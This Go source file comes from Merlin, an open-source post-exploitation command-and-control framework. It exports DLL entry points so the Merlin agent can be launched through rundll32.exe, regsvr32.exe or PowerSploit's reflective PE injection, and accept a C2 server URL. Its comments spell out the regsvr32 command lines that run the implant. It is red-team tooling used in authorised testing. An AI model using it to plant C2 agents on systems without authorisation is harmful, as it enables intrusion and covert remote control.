// +build windows,cgo

// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	"C"
	"os"
	"strings"
)

// EXPORTED FUNCTIONS

//export Run
// Run is designed to work with rundll32.exe to execute a Merlin agent.
// The function will process the command line arguments in spot 3 for an optional URL to connect to
func Run() {
	// If using rundll32 spot 0 is "rundll32", spot 1 is "merlin.dll,Run"
	if len(os.Args) >= 3 {
		if strings.HasPrefix(strings.ToLower(os.Args[0]), "rundll32") {
			url = os.Args[2]
		}
	}
	main()
}

//export VoidFunc
// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
func VoidFunc() { main() }

//export DllInstall
// DllInstall is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /n /i merlin.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
func DllInstall() { main() }

//export DllRegisterServer
// DLLRegisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s merlin.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
func DllRegisterServer() { main() }

//export DllUnregisterServer
// DLLUnregisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /u merlin.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
func DllUnregisterServer() { main() }

//export Merlin
// Merlin is an exported function that takes in a C *char, converts it to a string, and executes it.
// Intended to be used with DLL loading
func Merlin(u *C.char) {
	if len(C.GoString(u)) > 0 {
		url = C.GoString(u)
	}
	main()
}
